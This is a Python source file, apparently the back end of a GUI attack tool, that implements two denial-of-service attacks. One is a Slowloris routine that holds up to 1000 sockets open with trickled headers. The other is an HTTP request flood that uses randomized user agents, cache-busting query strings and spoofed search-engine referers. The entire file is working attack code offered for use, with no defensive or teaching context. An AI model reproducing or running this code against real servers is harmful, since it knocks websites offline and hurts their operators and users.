import time
import sys
import os
import sys
import time
import string
import math
from urllib.parse import urlparse
import  http.client
from random import *
from socket import *
from struct import *
from threading import *
from termcolor import colored,cprint



headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"
]

sockets = []

def setupSocket(ip,prt):
    sock = socket(AF_INET,SOCK_STREAM)
    sock.settimeout(8)
    if prt == "" :
       prt = 80
    sock.connect((ip, int(prt)))
    sock.send("GET /?{} HTTP/1.1\r\n".format(randint(0, 1337)).encode("utf-8"))

    for header in headers:
        sock.send("{}\r\n".format(header).encode("utf-8"))

    return sock





def slowloris_start(dos, ip,trd,prt):

    output="Starting slowloris attack on"+str(ip)+"Connecting to "+str(trd)+"sockets."
    dos.dos_textBrowser.append(output)
    for t in range(trd):
        try:
            output1="Socket "+str(t)
            dos.dos_textBrowser.append(output1)
            sock = setupSocket(ip,prt)
        except error:
            break

        sockets.append(sock)

    while True:
        output2="Connected to "+str(len(sockets))+"sockets. Sending headers..."
        dos.dos_textBrowser.append(output2)
        for sock in list(sockets):
            try:
                sock.send("X-a: {}\r\n".format(randint(1, 4600)).encode("utf-8"))
            except error:
                sockets.remove(sock)

        for _ in range(trd - len(sockets)):
            output3="Re-opening closed sockets..."
            dos.dos_textBrowser.append(output3)
            try:
                sock = setupSocket(ip)
                if sock:
                    sockets.append(sock)
            except error:
                break

        time.sleep(15)


def add_bots():
	bots=[]
	bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
	bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
	return bots
def add_useragent():
	uagents = []
	uagents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
	uagents.append('(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
	uagents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
	uagents.append('Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50')
	uagents.append('Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)')
	uagents.append('Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
	uagents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	uagents.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
	return uagents
       



class Requester(Thread):
	def __init__(self,tgt):
		Thread.__init__(self)
		self.tgt = tgt
		self.port = None
		self.ssl = False
		self.req = []
		self.lock=Lock()
		url_type = urlparse(self.tgt)
		if url_type.scheme == 'https':
			self.ssl = True
			if self.ssl == True:
				self.port = 443
		else:
			self.port = 80

	def header(self):
		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
		acceptC = ['ISO-8859-1','utf-8','Windows-1251','ISO-8859-2','ISO-8859-15']
		bot = add_bots()
		c=choice(cachetype)
		a=choice(acceptEc)
		http_header = {
		    'User-Agent' : choice(add_useragent()),
		    'Cache-Control' : c,
		    'Accept-Encoding' : a,
		    'Keep-Alive' : '42',
		    'Host' : self.tgt,
		    'Referer' : choice(bot)
		}
		return http_header
	def rand_str(self):
		mystr=[]
		for x in range(3):
			chars = tuple(string.ascii_letters+string.digits)
			text = (choice(chars) for _ in range(randint(7,14)))
			text = ''.join(text)
			mystr.append(text)
		return '&'.join(mystr)
	def create_url(self):
		return self.tgt + '?' + self.rand_str()
	def data(self):
		url = self.create_url()
		http_header = self.header()
		return (url,http_header)

	def run(self):
		try:
			if self.ssl:
				conn = http.client.HTTPSConnection(self.tgt,self.port)
			else:
				conn = http.client.HTTPConnection(self.tgt,self.port)
				self.req.append(conn)
			for reqter in self.req:
				(url,http_header) = self.data()
				method = choice(['get','post'])
				reqter.request(method.upper(),url,None,http_header)
		except Exception as e:
			print (e)
		finally:
			self.closeConnections()
	def closeConnections(self):
		for conn in self.req:
			try:
				conn.close()
			except:
				pass



def request_start(dos, tgt,trd):
    output9='[+] Started sending request to: '+str(tgt)
    dos.dos_textBrowser.append(output9)
    while True :
        for x in range(int(trd)):
            t=Requester(tgt)
            t.setDaemon(True)
            t.start()
            t.join()
        

def main (dos,option, tgt,trd,prt):
  if trd == "":
    trd = 1000	
  trd=int(trd)
  if option=="Slowloris":
     slowloris_start(dos, tgt,trd,prt)
  elif option=="Requests": 
        request_start(dos,tgt,trd)
  else:
			pass